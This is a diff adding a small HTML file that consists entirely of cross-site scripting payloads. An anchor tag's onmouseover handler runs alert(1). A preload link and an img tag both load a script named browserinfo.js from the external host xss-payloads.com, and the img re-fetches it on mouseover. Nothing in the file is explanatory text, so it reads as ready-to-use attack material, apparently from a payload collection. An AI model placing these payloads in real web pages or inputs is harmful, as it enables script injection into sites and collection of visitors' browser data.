@@ -1,0 +1,6 @@
+<link rel="preload" href="http://www.xss-payloads.com/payloads/scripts/browserinfo.js" as="script">
+
+<a onmouseover="alert(1)" href="#">read this!</a>
+
+<img onmouseover="this.src='http://www.xss-payloads.com/payloads/scripts/browserinfo.js'" src="http://www.xss-payloads.com/payloads/scripts/browserinfo.js">
+
